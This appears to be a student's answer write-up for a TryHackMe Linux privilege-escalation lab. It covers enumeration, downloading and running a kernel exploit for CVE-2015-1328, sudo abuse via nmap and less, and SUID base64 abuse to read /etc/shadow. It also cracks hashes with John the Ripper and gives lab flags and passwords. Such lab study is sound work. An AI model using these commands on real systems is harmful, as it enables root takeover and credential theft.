# Linux Privilege Escalation
Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.
## Enumeration
what is the hostname of the target system
```
$ hostname
$ wade7363
```
What is the linux kernel version of the target system
```
$ uname -r
$ 3.13.0.24-generic
```
What Linux is this
```
$ cat /etc/os-release
NAME = "Ubuntu Linux"
```
What version of the Python Language is installed on the system
```
$ python --version
2.7.6
```
What vulnerability seems to affect the kernel of the target system? (Enter CVE number)

we can search the CVE number on databases like exploit-db
```
CVE-2015-1328
```
## Privilege escalation: kernel exploits
On local machine: 
http.server is being used because only machines within the tryhackme network can be used with `wget`
```
$ wget https://www.exploit-db.com/download/37292 > exploit.c && mv exploit.c /tmp
$ python -m http.server 12000
$ ip addr
(copy tun0 IP)
```
On remote machine:
```
$ wget http://HOST_IP:12000 
$ gcc exploit.c && ./a.out
```
What is the content of the flag1.txt?
```
THM-28392872729920
```
## Privilege escalation: sudo
How many programs can the user "karen" run on the target system with sudo rights?
```
$ sudo -l
```
Answer: 3

What is the content of the flag2.txt?
```
$ cat /home/ubuntu/flag2.txt
THM-402028394
```
How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

we will find this in here: https://gtfobins.github.io/gtfobins/nmap/
```
$ sudo nmap --interactive
```
what is the hash of frank's password?
`less` has root permisssions
```
$ sudo less /etc/shadow
$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLH
```
## Pirivlege escalation: SUID
Finding out packages with SUID set
```
$ find / -type f -perm -0400 2> /dev/null
```
we can use base64 out of the list 
```
$ base64 /etc/shadow | base64 --decode
$ base64 /etc/passwd | base64 --decode
```
+ Copy down the outputs into files `passwd.txt` and `shadow.txt` 
+ Use the `unshadow` package to combine both
+ Use `John the ripper`
```
$ unshadow passwd.txt shadow.txt > passwords.txt
$ john passwords.txt
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
test123          (gerryconway)
Password1        (karen)
Password1        (user2)
```
+ Which user shares the name of a great comic book writer?
gerryconway
+ What is the password of user2?
Password1   
+ What is the content of the flag3.txt file?
```
$ ssh user2@MACHINE_IP
$ cd /home/Ubuntu
$ base64 flag3.txt | base64 --decode
```
